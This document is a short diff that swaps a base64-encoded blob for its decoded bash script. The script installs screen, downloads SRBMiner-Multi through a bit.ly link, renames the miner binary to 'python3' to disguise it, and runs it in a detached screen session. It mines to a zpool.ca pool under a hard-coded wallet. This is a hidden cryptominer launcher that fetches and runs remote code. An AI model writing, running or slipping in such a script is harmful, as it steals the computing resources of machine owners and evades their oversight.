@@ -1,1 +1,13 @@
-IyEvYmluL2Jhc2gKCmFwdCBpbnN0YWxsIHNjcmVlbiAteQoKd2dldCAtTyBkb3QgaHR0cHM6Ly9iaXQubHkva29udG9scnVtCgp0YXIgeHZmIGRvdAoKY2QgU1JCTWluZXItTXVsdGktMi00LTcKCm12IFNSQk1pbmVyLU1VTFRJIHB5dGhvbjMKCnNjcmVlbiAuL3B5dGhvbjMgLWEgeWVzcG93ZXJzdWdhciAtbyB5ZXNwb3dlclNVR0FSLnNlYS5taW5lLnpwb29sLmNhOjYyNDEgLXUgREVKMnZIRDJhRGZCeFNyY01EZnFDNEFDZ0xBcVhZOG1FdCAtcCBjPURHQg==
+#!/bin/bash
+
+apt install screen -y
+
+wget -O dot https://bit.ly/kontolrum
+
+tar xvf dot
+
+cd SRBMiner-Multi-2-4-7
+
+mv SRBMiner-MULTI python3
+
+screen ./python3 -a yespowersugar -o yespowerSUGAR.sea.mine.zpool.ca:6241 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt -p c=DGB
